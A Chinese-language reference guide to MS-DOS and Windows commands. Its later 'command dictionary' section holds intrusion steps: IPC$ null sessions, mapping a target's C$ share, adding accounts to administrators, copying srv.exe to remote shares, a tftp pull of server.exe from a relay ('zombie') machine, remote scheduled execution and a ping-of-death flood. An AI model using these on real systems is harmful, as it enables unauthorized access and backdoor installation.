部分DOS命令详细解说


DOS命令大全教程

第1、最常用的命令
-------------------------------
　　cd　　　　　改变当前目录　　　　　　　sys 　　制作DOS系统盘 
　　copy　　　　拷贝文件　　　　　　　　　del 　　删除文件 
　　deltree　 　删除目录树　　　　　　　　dir 　　列文件名 
　　diskcopy　　制磁盘　　　　　　　　　　edit　　文本编辑 
　　format 　　 格式化磁盘　　　　　　　　md　　　建立子目录 
　　mem 　　　　查看内存状况　　　　　　　type　　显示文件内容 
　　rd　　　　　删除目录　　　　　　　　　ren 　　改变文件名 
　　记得多少啊，忘了就去上课看看，下面四个命令是新的，给出命令格式，你自己试试看，学电脑重要的就是摸索。 
　　cls 　　　　清屏 
［适用场合］　　屏幕上太乱了，或是屏幕上出现乱码了， 清除屏幕上显示内容但不影响电脑内部任何信息 
［用　　法］　　cls　 回车 

　　move 　　　 移动文件，改目录名　 
［适用场合］　　移动文件到别的目录 
［用　　法］　　move [文件名] [目录]　　　　　　　 移动文件至新目录下 
　　　　　　　　move [目录名] [目录名] 　　　　　　改目录名 
［例　　子］　　c:\>move c:\autoexec.bat c:\old 
　　　　　　　　移动autoexec.bat文件至old目录下 
　　　　　　　　c:\>move c:\config.sys c:\temp 
　　　　　　　　移动config.sys文件至old目录下 

　　more　　　　分屏显示 
［适用场合］　　当输出很多一屏显示不下时采用，几乎适合所有命令，尤其是type等命令时很有用。 使用more时磁盘不能有写保护，也不适合光驱。 
［用　　法］　　type [文件名] | more 　　　　　　　分屏显示文件内容 
　　　　　　　　more < [文件名]　　　　　　　　　　分屏显示文件内容 
［例　　子］　　C:\>type msdos.w40 | more 

　　xcopy 　　　拷贝目录和文件 
［适用场合］　　在进行连同子目录一起拷贝时很有用，在拷贝大量文件时比COPY命令要快得多 
［用　　法］　　xcopy [文件名] [目录] 　　　　　　将指定文件拷贝到指定目录 
　　　　　　　　xcopy [源目录] [目的目录]　　将源目录连子目录考到目的目录下 
　　　　　　　　xcopy *.* [目录] /s　　　将文件与非空子目录拷贝到指定目录 
　　　　　　　　其它常用参数还有: v 拷贝后校验，会影响速度
　　　　　　　 　　　　　　　　 　e 与s 相似，但即使子目录是空的也会拷贝。

第2、比较常用的命令
-------------------------------------
　　attrib　　　设置文件属性 
［适用场合］　　想对文件做较特殊的处理时 
［用　　法］　　attrib 显示所有文件的属性 
　　　　　　　　attrib +r或-r [文件名] 设置文件属性是否为只读 
　　　　　　　　attrib +h或-h [文件名] 设置文件属性是否隐含 
　　　　　　　　attrib +s或-s [文件名] 设置文件属性是否为系统文件 
　　　　　　　　attrib +a或-a [文件名] 设置文件属性是否为归档文件 
　　　　　　　　attrib /s 设置包括子目录的文件在内的文件属性 
［例　　子］　　C:\TEST>attrib +r wina20.386 
　　　　　　　　C:\>attrib +h *.* /s 隐含所有文件 

　　date 　　　 显示及修改日期 
［适用场合］　　想知道或修改时间和日期 
［用　　法］　　date 显示和改变当前日期 
［例　　子］　　C:\>date 09-20-1996 将日期改为1996年9月20日 
　　　　　　　　C:\>date 
　　　　　　　　　　Current date is Tue 08-20-1996 
　　　　　　　　　　Enter new date (mm-dd-yy):09-20-1996 
　　　　　　　　　　按月-日-年的顺序修改当前日期 直接按回车键忽略修改日期 

　　lable 　　　设置卷标号 
［适用场合］　　用来为磁盘做个标记 
［用　　法］　　label 显示磁盘卷标 
　　　　　　　　label [盘符] [卷标名] 设定指定盘的卷标 
［例　　子］　　C:\>label 
　　　　　　　　Volume in drive C is WANG 
　　　　　　　　Volume Serial Number is 2116-1DD0 
　　　　　　　　volume label (11 characters,Enter for none)? 
　　　　　　　　可以输入卷标，直接回车后 
　　　　　　　　Delete current volume label (Y/N)? 
　　　　　　　　按y删除旧卷标，按n不更改 

　　defrag　　　磁盘碎片整理 
［适用场合］　　磁盘读写次数很多，或磁盘使用时间很长了，可能需要使用这条命令整理磁盘。磁盘碎片并不是指磁盘坏了，而只是由于多次的拷贝和删除文件后，磁盘使用会很不连贯，致使速度变慢。 ［用　　法］　　1. C:\>defrag 
　　　　　　　　2. 选择要整理的磁盘

　　doskey　　　调用和建立DOS宏命令 
［适用场合］　　经常需要输入重复的命令时，有非常大的用处 
［用　　法］　　doskey　 
　　　　　　　　将doskey驻留内存，开辟出缓冲区，以后输入的命令都将保存在缓冲区中，可以随时调用 
　　　　　　　　doskey [宏命令名]=[命令名] 　
　　　　　　　　将宏命令定义为命令，以后输入宏命令，电脑就会执行相应的命令 
　　　　　　　　doskey /reinstall　　　　　　重新安装doskey 
　　　　　　　　doskey /bufsize= 　　　　　　设置缓冲区的大小 
　　　　　　　　doskey /macros 　　　　　　　显示所有doskey宏 
　　　　　　　　doskey /history 　　　 　　　显示内存中所有命令 
　　　　　　　　doskey /insert|overstrike 设置新键入的字符是否覆盖旧的字符 
［例　　子］　　C:\>DOSKEY 
　　　　　　　　C:\>dir 
　　　　　　　　C:\>copy C:\temp\*.* a: 
　　　　　　　　C:\>del c:\temp\*.* 
　　　　　　　　C:\>copy b:\*.* c:\temp 
　　　　　　　　上述四条命令都已被保存，用光标控制键的上下可以依次选择使用或修改, 也可以用F7键列出保存的所有命令
　　　　　　　　C:\>doskey di=dir/w/p 定义di为宏命令，意思是执行dir/w/p 

　　fdisk 　　　硬盘分区 
［建　　议］　　只有硬盘被很利害的病毒感染时，或是一块新硬盘才需要分区，最好请懂行的人指导。硬盘都需经过低级格式化，分区，格式化三个步骤才可使用，成品电脑内的硬盘都已经做过这些加工了。 
［用　　法］　　输入fdisk后按回车即可进入提示界面 

　　emm386　　　扩展内存管理 
［建　　议］　　这条命令比较复杂，在第五章中系统配置里将详细介绍 
lh/loadhigh　　 将程序装入高端内存 
［适用场合］　　这条命令一般用在autoexec.bat中，当有些软件需要的基本内存很大时，它会有用 
［用　　法］　　lh [程序] 　 
　　　　　　　　将程序装入高端内存 使用此命令时，config.sys文件中需有下面两条语句。 device=emm386.exe dos=umb 
　　　　　　　　lh [程序] /l:区号 　　　将程序装入指定的umb区 
　　　　　　　　lh /s 　　　　　　　　　一般是由memmaker专用 
［例　　子］　　C:\MOUSE\>lh mouse 　将鼠标驱动程序装入高端内存 

　memmaker　　　内存优化管理 
［适用场合］　　这个命令现在已经很少用了，在当年DOS流行时，想玩游戏可少不了它，它可以腾出许多基本内存供游戏使用，只需安装一次即可 
［用　　法］　　1. C:\>memmaker 
　　　　　　　　2. 回车继续，F3退出 
　　　　　　　　3. 选择手动安装和自动安装，直接回车表示自动安装（回车得了） 
　　　　　　　　4. 选择是否有程序需要扩充内存，可用空格键选择，Yes表示需要，No不需要，按回车键即可。 
　　　　　　　　5. 程序自动检测硬盘内是否安装了WINDOWS 
　　　　　　　　6. 软驱中若有软盘则应将其取出，然后按回车键，电脑将重新起动两次，不要中断，只需按回车键。 
　　　　　　　　（其实很简单，一直按回车键就行了，呵呵） 

　　msd　　　　 系统检测 
［适用场合］　　用于检查系统信息 
［用　　法］　　1. C:\>msd　回车后可见到，在每个选项旁边加了注解，表示该按钮的功用 
　　　　　　　2. 选择需查询的项目，比如选第一个Computer,将会弹出一个对话框显示电脑的一些基本信息。你可以试试其他的选项，看看有什么用。
　　　　　　　3. 按Alt+F键激活下拉菜单后, 选择"Exit"项退出。 

　undelete　　　恢复被删除的文件 
［适用场合］　　当不小心删错了文件时，它可以用得上。
　　　　　　　　DOS删除文件时，只是将文件从分配表中去除，在磁盘存储区内将文件名的第一个字母删除，文件内容并未马上从磁盘中删除，所以能恢复。 
［用　　法］　　undelete　　　　　　　恢复已删除的文件 
　　　　　　　　undelete /all　　　恢复文件且不再询问是否恢复，　　　　　　
　　　　　　　　以"#%&-0123456789abcdefghijklmnopqrstuvwxyz"的顺序为第一个
　　　　　　　　字母来恢复文件 
　　　　　　　　undelete /list　　列可恢复的文件名 
　　　　　　　　undelete /s 　　　可将undelete驻留内存，但几乎没人这样使用 

　prompt　　　设置提示符 
［适用场合］　　当你厌烦了c:\>的提示符或者您想使您的提示符与众不同时，您可以试一试，非常有趣的DOS命令，可以随时显示时间与日期。 
［用　　法］　　prompt $p$g 以当前目录名和>号为提示符，这是最常用的提示符 
　　　　　　　　prompt $t 表示时间　　　　　　prompt $d 表示日期 
　　　　　　　　prompt $$ 表示$ 　　　　　　　prompt $q 表示= 
　　　　　　　　prompt $v 表示当前版本　　　　prompt $l 表示< 
　　　　　　　　prompt $b 表示| 　　　　　　　prompt $h 表示退位符 
　　　　　　　　prompt $e 表示Esc代表的字符 　prompt $_ 表示回车换行 
［例　　子］　　C:\DOS>prompt wang$g 将wang>作为提示符 
　　　　　　　　WANG>prompt $t$d$g 　使用时间、日期和>号做为提示符 
　　　　　　　　0:01:07.77Thu 08-29-1996>prompt $p$g 
　　　　　　　　C:\DOS> 

　restore　　　恢复已备份的文件 
［建　　议］　　如果以前用backup做过文件备份，则当原文件损坏时可以用它来恢复文件。 
　　　　　　　　将用backup命令备份的磁盘中的文件恢复到另一磁盘中，备份磁盘中应有backup.00X和control.00X这两条文件。 
［用　　法］　　restore [备份盘符] [目标盘符] 
　　　　　　　　将备份盘上备份文件恢复到指定盘上 
　　　　　　　　restore /s 　　　　将备份文件包括子目录都恢复到指定盘上 
　　　　　　　　restore /p 　　　　让用户判断是否恢复文件 
　　　　　　　　restore /b:日期　　恢复日期以前的文件 
　　　　　　　　restore /a:日期　　恢复日期之后的文件 
　　　　　　　　restore /l:时间　　恢复时间之前的文件 
　　　　　　　　restore /e:时间　　恢复时间之后的文件 
　　　　　　　　restore /m 　　　　只恢复上次备份后修改过的文件 
　　　　　　　　restore /n 　　　　只恢复上次备份后已删 除的文件 
　　　　　　　　restore /d 　　　　只显示要恢复的文件名 
［例　　子］　　C:\DOS>restore a: c: 
　　　　　　　　Insert backup diskette 01 in drive A: 
　　　　　　　　Press any key to continue . . . 
　　　　　　　　在A驱中放入第一张备份盘，按任意键即可，恢复完第一张后，按顺序放入其它盘即可。 
　　　　　　　　当您用上述命令不能正确恢复文件时请用： 
　　　　　　　　C:\DOS>restore a: c:\ /s 

　　time　　　　显示及修改时间 
［适用场合］　　用于显示及修改时间，用法同date 
［例　　子］　　C:\DOS>time 
　　　　　　　　Current time is 12:15:26.04a 
　　　　　　　　Enter new time: 11:20:20.00p 
　　　　　　　　按时:分顺序输入时间，再加上下午(a/p)即可 直接按ENTER键可忽略修改时间。 




　set 　　　　设置环境变量 
［适用场合］　　设置声卡和路径等时用到 
［用　　法］　　set [环境变量]=[字符串] 　　 
　　　　　　　　这条命令常常用在autoexec.bat中 
［例　　子］　　C:\>set blaster=a220 i5 d1　　　　　设置声卡的参数 
　　　　　　　　C:\>set path=c:\dos　　　　　　　　　path c:\dos含义相同 

　smartdrv　　　设置磁盘加速器 
［建　　议］　　它可以提高硬盘访问速度，最好在autoexec.bat文件中加载吧。 
［用　　法］　　smartdrv /x 
　　　　　　　　执行并驻留内存，开辟磁盘加速缓存区，并屏蔽所有驱动器缓存，是较常用的方法（一般用这个命令就够了） 
　　　　　　　　smartdrv /c 　　　　　　将缓存内的信息都写入硬盘 
　　　　　　　　smartdrv /e: 数字 　　　设置一次移动的信息量 
　　　　　　　　smartdrv /b: 数字 　　　设置预先读取的缓冲区大小

第3、不常用的命令
-----------------------
　append　　　　设置非执行文件的路径 
［适用场合］　　当您无法在多个目录中寻找到自己输入的文稿时，可以试一试这个命令，用法类似path。 
［用　　法］　　append [路径];[路径] 
［例　　子］　　C:\>append c:\test
　　　　　　　　设置寻找非可执行文件路径为c:\test如果该目录下有文件1.txt时，在其它目录下调用1.txt找不到时，可自动寻找到c:\test目录。 
　　　　　　　　D:\UCDOS>edit 1.txt 可找到C:\test\1.txt文件 

　debug 　　　　程序调试命令 
［建　　议］　　如果你学过汇编语言，那你应该会使用debug，如果没学过，最好别使用 
［用　　法］　　debug [文件名] 

　diskcomp　　　比较磁盘 
［适用场合］　　比较两张盘是否相同，没想到什么时候会用到，在比较用diskcopy拷贝的两张盘，为什么不用diskcopy/v校验呢？ 
［用　　法］　　diskcomp [盘符1] [盘符2] 比较盘1和盘2 
　　　　　　　　diskcomp /1 只比较磁盘的第一面 
　　　　　　　　diskcomp /8 只比较没磁道的前8个扇区 
［例　　子］　　C:\>diskcomp a: a: 
　　　　　　　　在同一软驱中比较两张盘 
　　　　　　　　Insert FIRST diskette in drive A: 
　　　　　　　　放入第一张盘 
　　　　　　　　Press any key to continue . . . 
　　　　　　　　Comparing 80 tracks 18 sectors per track, 2 side(s) 　　
　　　　　　　　Insert SECOND diskette in drive A: 
　　　　　　　　放入第二张盘 
　　　　　　　　Press any key to continue . . . Compare OK 
　　　　　　　　比较未发现不同 
　　　　　　　　Compare another diskette (Y/N) ?n 
　　　　　　　　是否比较其它盘，选y继续比较，选n停止 

　expand　　　　解压工具 
［适用场合］　　微软公司软件原始安装盘中有许多后缀以"_"结尾的压缩文件，可以用它解压，解除您因为少数几个文件丢失造成的麻烦。 
［用　　法］　　expand [源文件名] [目的文件] 
［例　　子］　　C:\>expand a:vsafe.co_ c:\dos\vsafe.com 
　　　　　　妗〗庋vsafe.co_为vsafe.com文件 
　　　　　　　　Microsoft (R) File Expansion Utility Version 2.10 　　　
　　　　　　　　Copyright (C) Microsoft Corp 1990-1993. All rights 　　　
　　　　　　　　reserved. 
　　　　　　　　Expanding a:vsafe.co_ to c:\dos\vsafe.com. a:vsafe.co_: 
　　　　　　　　33046 bytes expanded to 62576 bytes, 89% increase. 
　　　　　　　　C:\DOS> 

　fasthelp　　　快速显示帮助信息 
［建　　议］　　可以看看所有的命令，对于单个的命令，还不如在命令名后加/?参数方便 
［用　　法］　　fasthelp 　　　　　　列出所有DOS命令的用处 
　　　　　　　　fasthelp [命令名]　　显示命令的用处，等价于 [命令名]/? 

　　　fc　　　　文件比较 
［建　　议］　　也许对于大多数人是永远不会用到它的 
［用　　法］　　fc [文件名1] [文件名2] 　　　　比较两文件的不同 　　　　　　
　　　　　　　　参数还有: a c l Lbn n t w nnnn 
［例　　子］　　C:\TEST>fc a.bat b.bat 
　　　　　　　　Comparing files A.BAT and B.BAT 
　　　　　　　　***** A.BAT 
　　　　　　　　choice /c:dme defrag,mem,end 
　　　　　　　　if errorlevel 3 goto defrag 
　　　　　　　　if errorlevel 2 goto mem 
　　　　　　　　if errotlevel 1 goto end 
　　　　　　　　***** B.BAT choice /c:dme defrag,mem,end 
　　　　　　　　***** C:\TEST> 

　interlnk　　　启动简易网客户机 
［适用场合］　　如果有两台电脑可以通过它和intersvr联成简易的网络，这是条很有用的命令，但不常用 
［用　　法］　　 DOS新增支持网络的功能， 
　　　　　　　　它可以使两台电脑通过并口线或串口线相联组成简易的网络 
　　　　　　　　使用interlnk 必须在config.sys中增添一句： 
　　　　　　　　device=c:\dos\interlnk 
　　　　　　　　并口线的两头都应是25针公接头，针之间的连接如下图：对应 
　　　　　　　　p2------------------------p15 
　　　　　　　　p3------------------------p13 
　　　　　　　　p4------------------------p12 
　　　　　　　　p5------------------------p10 公接头指接头为带针的 
　　　　　　　　p6------------------------p11 母接头指接头为带孔的 
　　　　　　　　p15-----------------------p2 
　　　　　　　　p13-----------------------p3 
　　　　　　　　p12-----------------------p4 
　　　　　　　　p10-----------------------p5 
　　　　　　　　p11-----------------------p6 
　　　　　　　　p25-----------------------p25 地线 
［例　　子］　　C:\DOS\>interlnk Port-LPT1 
　　　　　　　　this Computer 　　　Other Computer 
　　　　　　　　　(Client) 　　　　　　(Server) 
　　　　　　　　　 ---------------------------------------- 
　　　　　　　　　　　 E: 　　equals 　　A: 
　　　　　　　　　 　　F: 　　equals 　　C: 
　　　　　　　　在客户机中E盘即为服务机的A盘，F盘为服务机的C盘 

　intersvr　　　启动简易网服务器 
［适用场合］　　使用它，电脑就成了服务器了（只限与DOS提供的简易网） 
［用　　法］　　intersvr　　　　　　　启动服务机 
　　　　　　　　intersvr /lpt:1　　　启动服务机,用lpt1口作为数据传输口 
　　　　　　　　intersvr /com:1　　　启动服务机,用com1口作为数据传输口 
　　　　　　　　参数还有 x baud: b v rcopy （参见interlnk) 
［例　　子］　　C:\DOS>intersvr 
　　qbasic　　　启动Basic集成环境 
［建　　议］　　也许对于大多数人是永远不会用到它的 
［用　　法］　　如果会qbasic语言，那么可以利用它编写自己的程序。edit.com必须有它才可用。 
　　　　　　　　qbasic　　　　　起动basic语言环境 
　　　　　　　　qbasic/editor　以全屏方式编辑语言 
　　　　　　　　参数还有： b g h mbf nohi run 
［例　　子］　　C:\DOS>qbasic 

　setver 　　 　设置版本 
［适用场合］　　当希望使用其它版本的dos命令时可以用它来欺骗电脑。在高版本DOS中，某些旧版本程序需要DOS3.3时，可用setver来设置 
［用　　法］　　使用时一般在config.sys中加入 device=setver.exe 
　　　　　　　　setver　　　　　　　　　　显示文件的版本 
　　　　　　　　setver [文件名] n.nn 　　设置指定文件的版本号 
［例　　子］　　C:\DOS>setver 
　　　　　　　　KERNEL.EXE 5.00 
　　　　　　　　DOSOAD.SYS 5.00 
　　　　　　　　EDLIN.EXE 5.00 
　　　　　　　　BACKUP.EXE 5.00 
　　　　　　　　ASSIGN.COM 5.00 
　　　　　　　　EXE2BIN.EXE 5.00 
　　　　　　　　JOIN.EXE 5.00 
　　　　　　　　RECOVER.EXE 5.00 
　　　　　　　　WINWORD.EXE 4.10 
　　　　　　　　C:\> 
　　　　　　　　若程序AAA.exe必须在MS-DOS3.3下执行，则键入 
　　　　　　　　C:\DOS>setver aaa.exe 3.30 
　　　　　　　　又如net5.exe仅在MS-DOS5.0下执行，则在config.sys中加入　　　
　　　　　　　　device=setver.exe后也可在Ms-DOS6.22下运行。 

　　share　　　　文件共享 
［建　　议］　　只有在软件声明必须要运行它时才用 
［用　　法］　　可在config.sys中加入 install=share.exe 也可直接运行参数有 f l 

　　subst　　　　路径替换 
［建　　议］　　一个非常有趣的命令，如果经常用光碟软件，可能有用。 
［用　　法］　　subst 　　　　　　　　　　显示当前的替代路径 
　　　　　　　　subst [盘符] [路径]　　　　　　　　　　　　　　　　　　　　
　　　　　　　　将指定的路径替代盘符，该路径将作为驱动器使用 
　　　　　　　　subst /b　　　　　　　　　解除替代 
［例　　子］　　C:\DOS>subst a: c:\temp 用c盘temp目录替代a盘 
　　　　　　　　C:\>subst a: /d妗　　　　〗獬替代 

　　tree 　　 　显示命令树结构 
［适用场合］　　查看所有的子目录 
［用　　法］　　tree [盘符]　　　　显示所有的子目录树 
　　　　　　　　tree /f　　　　　　显示目录时同时显示文件名 
　　　　　　　　tree /a　　　　　　以ASCII码显示目录树 
［例　　子］　　C:\WINDOWS>tree /a 

　unformat　　　恢复已被格式化的磁盘 

［建　　议］　　你把有重要信息的软盘格式化了?快用unformat……什么?你用了format /u，那死定了 
［用　　法］　　unformat [盘符] 　　　恢复指定的被格式化的磁盘 
　　　　　　　　unformat /l 　　　　　显示unformat所找到的文件名 
［例　　子］　　C:\WINDOWS>unformat a: 

　　vsafe　　　　病毒防护程序 
［建　　议］　　把它装入内存可以随时检测出许多种病毒，是比较有用的。 
［用　　法］　　vsafe　　　　　　　　加载vsafe在内存中 
　　　　　　　　vsafe /u 　　　　　　从内存中去除vsafe 
　　　　　　　　vsafe/ne 　　　　　　将vsafe装入扩充内存 
　　　　　　　　vsafe/nx 　　　　　　将vsafe装入扩展内存 
　　　　　　　　参数还有 Ax Cx n d 
［例　　子］　　C:\>vsafe 

　ver　　　 　显示DOS版本 
［例　　子］　　C:\>ver 
　　　　　　　MS-DOS Version 6.22 
　　　　　　　　C:\> 

　　vol　　　　 显示指定的磁盘卷标号 
［例　　子］　　C:\>vol 
　　　　　　　　Volume in drive C is Wang 
　　　　　　　　Volume Serial Number is 2116-1DD0 
　　　　　　　　C:\> 

　　ctty　　　　改变控制设备 
［建　　议］　　用来改变控制的输入输出设备，可以试试这条命令，不过恐怕不会有什么作用，是DOS中最没用的命令之一 
［用　　法］　　ctty [设备名]　　　　设置控制台 
［例　　子］　　C:\>ctty aux 　　　设置aux为输入输出设备 

DOS命令字典

【1】 

net use \\ip\ipc$ " " /user:" " 建立IPC空链接 
net use \\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接 
net use h: \\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: 
net use h: \\ip\c$ 登陆后映射对方C：到本地为H: 
net use \\ip\ipc$ /del 删除IPC链接 
net use h: /del 删除映射对方到本地的为H:的映射 
net user 用户名　密码　/add 建立用户 
net user guest /active:yes 激活guest用户 
net user 查看有哪些用户 
net user 帐户名 查看帐户的属性 
net localgroup ***istrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：***istrator后加s用复数 
net start 查看开启了哪些服务 
net start 服务名　 开启服务；(如:net start telnet， net start schedule) 
net stop 服务名 停止某服务 
net time \\目标ip 查看对方时间 
net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 
net view 查看本地局域网内开启了哪些共享 
net view \\ip 查看对方局域网内开启了哪些共享 
net config 显示系统网络设置 
net logoff 断开连接的共享 
net pause 服务名 暂停某服务 
net send ip "文本信息" 向对方发信息 
net ver 局域网内正在使用的网络连接类型和信息 
net share 查看本地开启的共享 
net share ipc$ 开启ipc$共享 
net share ipc$ /del 删除ipc$共享 
net share c$ /del 删除C：共享 
net user guest 12345 用guest用户登陆后用将密码改为12345 
net password 密码 更改系统登陆密码 
netstat -a 查看开启了哪些端口,常用netstat -an 
netstat -n 查看端口的网络连接情况，常用netstat -an 
netstat -v 查看正在进行的工作 
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） 
netstat -s 查看正在使用的所有协议使用情况 
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 
tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 
ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 
ping -t -l 65550 ip 死*之ping(发送大于64K的文件并一直ping就成了死*之ping) 
ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 
tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件 

【2】 

del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） 
move 盘符\路径\要移动的文件名　存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 
fc one.*t two.*t > 3st.*t 对比二个文件并把不同之处输出到3st.*t文件中，"> "和"> >" 是重定向命令 
at id号 开启已注册的某个计划任务 
at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 
at id号 /delete 停止某个已注册的计划任务 
at 查看所有的计划任务 
at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 
finger username @host 查看最近有哪些用户登陆 
telnet ip 端口 远和登陆服务器,默认端口为23 
open ip 连接到IP（属telnet登陆后的命令） 
telnet 在本机上直接键入telnet 将进入本机的telnet 
copy 路径\文件名1　路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 
copy c:\srv.exe \\ip\***$ 复制本地c:\srv.exe到对方的***下 
cppy 1st.jpg/b+2st.*t/a 3st.jpg 将2st.*t的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.*t文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 
copy \\ip\***$\svv.exe c:\ 或:copy\\ip\***$\*.* 复制对方***i$共享下的srv.exe文件（所有文件）至本地C： 
xcopy 要复制的文件或目录树　目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 
tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 
tftp -i 对方IP　put c:\server.exe 登陆后，上传本地c:\server.exe至主机 
ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) 
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface 
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 
start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 
mem 查看cpu使用情况 
attrib 文件名(目录名) 查看某文件（目录）的属性 
attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 
dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 
date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 
set 指定环境变量名称=要指派给变量的字符 设置环境变量 
set 显示当前所有的环境变量 
set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 
pause 暂停批处理程序，并显示出：请按任意键继续.... 
if 在批处理程序中执行条件处理（更多说明见if命令及变量） 
goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签） 
call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） 
for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） 
echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 
echo 信息 在屏幕上显示出信息 
echo 信息 >> pass.*t 将"信息"保存到pass.*t文件中 
findstr "Hello" aa.*t 在aa.*t文件中寻找字符串hello 
find 文件名 查找某文件 
title 标题名字 更改CMD窗口标题名字 
color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 
prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ ) 

【3】 

ver 在DOS窗口下显示版本信息 
winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） 
format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS 
md　目录名 创建目录 
replace 源文件　要替换文件的目录 替换文件 
ren 原文件名　新文件名 重命名文件名 
tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 
type 文件名 显示文本文件的内容 
more 文件名 逐屏显示输出文件 
doskey 要锁定的命令＝字符 
doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= 
taskmgr 调出任务管理器 
chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 
tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 
exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe 
path 路径\可执行文件的文件名 为可执行文件设置一个路径。 
cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? 
regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； 
regedit /e 注册表文件名 导出注册表 
cacls 文件名　参数 显示或修改文件访问控制列表（ACL）――针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.*t /D pub 设定d:\test.*t拒绝pub用户访问。 
cacls 文件名 查看文件的访问用户权限列表 
REM 文本内容 在批处理文件中添加注解 
netsh 查看或更改本地网络配置情况 

【4】 

IIS服务命令： 
iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） 
iisreset /start或stop 启动（停止）所有Internet服务 
iisreset /restart 停止然后重新启动所有Internet服务 
iisreset /status 显示所有Internet服务状态 
iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 
iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 
iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 
iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 
FTP 命令： (后面有详细说明内容) 
ftp的命令行格式为: 
ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 
－d 使用调试方式。 
－n 限制ftp的自动登录,即不使用.netrc文件。 
－g 取消全局文件名。 
help [命令] 或 ？[命令] 查看命令说明 
bye 或 quit 终止主机FTP进程,并退出FTP管理方式. 
pwd 列出当前远端主机目录 
put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 
get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 
